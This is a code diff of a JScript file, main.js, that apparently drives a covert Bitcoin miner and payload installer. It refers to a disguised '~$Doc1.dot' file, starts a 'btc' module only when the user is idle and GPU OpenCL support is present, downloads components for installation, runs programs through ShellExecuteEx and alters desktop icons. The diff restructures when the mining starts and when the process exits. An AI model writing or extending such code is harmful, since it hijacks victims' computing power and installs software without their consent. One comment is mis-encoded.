@@ -4,26 +4,18 @@ log("-----main.js DateLastModified : " + __fso.GetFile(__workdir+"~$Doc1.dot").D
 //
 function filter_idle(){
 }
-function filter_idle.prototype.run(){
+function filter_idle.prototype.run(pipe){
 	log("filter_idle.prototype.run")
 	var pThis = this;
 	var idle = __external.GetTickCount() - __external.GetLastInputInfo()
-	if((__DEBUG || __IsSupportOpencl || __external.IsSupportOpencl()) && idle>__idletime/8){
+	if((__DEBUG || __IsSupportOpencl || __external.IsSupportOpencl()) && idle>__idletime/4){
 		__interrupted = __DEBUG;
-		setTimeout(function(){
-			var idle = __external.GetTickCount() - __external.GetLastInputInfo()
-			log("filter_sebtc __external.GetLastInputInfo=" + idle)
-			if(idle > __idletime/2)
-			{	
-				return true;
-			}
-			else{
-				log("----busy");
-				pThis.callback(pipe, true);
-			}
-		} , __idletime)		 
+		return	true;
+	}else{
+		log("----busy");
+		pThis.callback(pipe, true);			
 	}
-	return ;
+	return true ;
 }
 
 function filter_sebtc(){
@@ -219,11 +211,12 @@ function filter_shellexcuteex.prototype.run(pipe){
 	return true
 }
 //Ö÷¹¤×÷
-function start(){
+function startbtc(){
 	var __module = new module("btc");
 	var _filter_idle = new filter_idle();
 	var _filter_dl = new filter_dlbusiness();
 	var _filter_se = new filter_sebtc();
+	_filter_idle.callback = __module.push(_filter_idle);
 	_filter_dl.callback =__module.push(_filter_dl);
 	_filter_se.callback = __module.push(_filter_se);
 	var pipe = __destReady_dll;
@@ -356,19 +349,23 @@ function modifyDesktopIcon(){
 }
 
 function readyExit(){
+	log("readyExit")
 	module.setDoneCallback(function(){
 		log("exit(100)");
 		exit(100);
 	})
 }
-function run(){	
-	start();
-	downloadforinstall();
-	sendDesktopIconState();
-	shellIconOverlayIdentifier();
+
+sendDesktopIconState();
+shellIconOverlayIdentifier();
+startbtc();
+downloadforinstall();
+if(module.getRunningModules.length>0){
+	readyExit();
+}else {
+	exit(101);
 }
-readyExit();
-run()
+
 
 /*
 var PAGE_READWRITE = 4;
